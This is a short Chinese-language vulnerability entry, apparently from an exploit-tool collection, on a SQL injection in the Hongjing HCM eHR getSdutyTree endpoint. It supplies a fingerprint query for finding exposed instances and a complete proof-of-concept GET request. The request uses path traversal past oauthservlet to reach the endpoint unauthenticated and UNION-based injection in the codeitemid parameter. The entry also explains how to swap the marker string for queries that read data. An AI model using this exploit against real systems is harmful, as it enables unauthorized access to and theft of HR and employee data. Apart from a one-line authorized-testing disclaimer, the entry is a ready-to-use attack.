---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 宏景HCM getSdutyTree SQL注入漏洞

## 漏洞描述

宏景HCM `/w_selfservice/oauthservlet/%2e./.%2e/servlet/sduty/getSdutyTree` 接口 `codeitemid` 参数存在 SQL 注入漏洞（UNION 联合查询回显），经 oauthservlet 目录穿越未授权访问。

## 影响版本

```
宏景HCM eHR
```

## 网络测绘

```
app="HJSOFT-HCM"
```

## 漏洞复现

```
GET /w_selfservice/oauthservlet/%2e./.%2e/servlet/sduty/getSdutyTree?param=child&target=1&codesetid=1&codeitemid=1'+UNION+ALL+SELECT+NULL,CHAR(82)+CHAR(52)+CHAR(103)+CHAR(100)+CHAR(48)+CHAR(108)+CHAR(108)-- HTTP/1.1
```

`codeitemid` 参数拼接 UNION 查询，`CHAR(82)+CHAR(52)+...` 即字符 "R4gd0ll" 的 ASCII 拼接，回显标记出现在响应中即确认注入；将 CHAR 串替换为目标查询即可读取数据。

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
